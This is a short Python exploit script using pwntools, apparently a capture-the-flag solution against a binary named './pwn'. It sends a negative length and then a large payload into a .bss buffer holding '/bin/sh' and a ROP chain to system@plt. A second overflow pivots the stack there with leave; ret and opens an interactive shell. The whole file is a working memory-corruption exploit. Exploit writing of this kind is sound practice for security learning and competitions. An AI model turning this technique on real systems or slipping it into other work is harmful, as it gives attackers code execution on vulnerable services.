from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-v']

#p = remote('127.0.0.1', 44129)
p = process('./pwn')
#gdb.attach(p, 'b *0x401339')

pop_rdi = 0x401219
system_plt = 0x4010a0
bss_desc = 0x404060
pivot = 0x404060 + 0x8a0
ret = 0x40101a
leave_ret =0x40120f

p.sendlineafter(b'introduction.\n', b'-1')

payload =b'a'*0x8a0 + b'/bin/sh\x00' + p64(pop_rdi) + p64(pivot) + p64(ret) + p64(system_plt)
p.send(payload)

payload2 = b'a'*0xc + p64(pivot) + p64(leave_ret)
p.sendafter("number:\n", payload2)
p.interactive()
